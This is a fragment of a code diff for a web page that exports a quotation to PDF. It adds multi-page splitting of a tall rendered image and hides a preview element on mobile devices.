                     const pdfWidth = pdf.internal.pageSize.getWidth();
                     const pdfHeight = (imgProps.height * pdfWidth) / imgProps.width;
-                    pdf.addImage(imgData, 'PNG', 0, 0, pdfWidth, pdfHeight);
+
+                    let position = 0;
+                    const pageHeight = pdf.internal.pageSize.getHeight();
+                    while (position < pdfHeight) {
+                        pdf.addImage(imgData, 'PNG', 0, -position, pdfWidth, pdfHeight);
+                        position += pageHeight;
+                        if (position < pdfHeight) {
+                            pdf.addPage();
+                        }
+                    }
+
                     pdf.save(`${quotationTitle}_${formattedDate}_${quotationNumber}.pdf`);
+
+                    if (isMobile) {
+                        previewDesktop.style.display = 'none';
+                    }
                 }).catch(error => {
                     console.error('生成 PDF 失敗:', error);
                     alert('生成 PDF 失敗，請稍後再試！');
@@ -1115,7 +1754,6 @@
             }, 500);
         }
 
-        // 綁定新增項目按鈕
         document.getElementById('add-item').addEventListener('click', addItem);
     </script>
 </body>
